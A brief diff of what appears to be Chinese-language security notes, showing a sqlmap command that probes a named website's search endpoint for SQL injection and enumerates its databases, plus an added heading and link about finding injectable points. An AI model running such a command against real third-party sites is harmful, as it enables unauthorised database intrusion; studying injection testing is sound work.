@@ -285,3 +285,6 @@ python sqlmap.py -u https://open.isyscore.com/api/opencms/search\?current\=1\&si
 python sqlmap.py -u https://open.isyscore.com/api/opencms/search\?current\=1\&size\=10\&keyword\=%27\&category\=%E6%96%87%E7%AB%A0 --dbs
 ```
 
+##### 如何发现可注入的点
+
+https://cloud.tencent.com/developer/article/1196791
